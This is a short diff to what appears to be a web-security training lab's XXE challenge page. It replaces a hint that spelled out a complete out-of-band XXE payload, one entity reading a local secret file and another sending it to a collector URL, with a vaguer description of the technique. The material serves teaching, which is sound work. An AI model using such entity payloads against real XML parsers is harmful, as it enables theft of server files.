@@ -39,7 +39,7 @@ router.get('/dtd', (req, res) => {
       </div>
       <button class="clay-btn clay-btn-primary" type="submit">Import XML</button>
     </form>
-    ${hintBox('Your DTD needs two declarations: <code>&lt;!ENTITY % file SYSTEM "file://' + esc(SECRET_ABS) + '"&gt;</code> and <code>&lt;!ENTITY pingback SYSTEM "' + esc(base) + '/xxe/collector/log?d=%file;"&gt;</code>. The starter template on the collector page has it ready to paste.')}
+    ${hintBox('Your DTD needs two declarations working together: one that reads a local file into a parameter entity, and one that makes the server request the collector URL with that content in it. The collector page explains the two jobs your DTD has to do.')}
   `));
 });
 
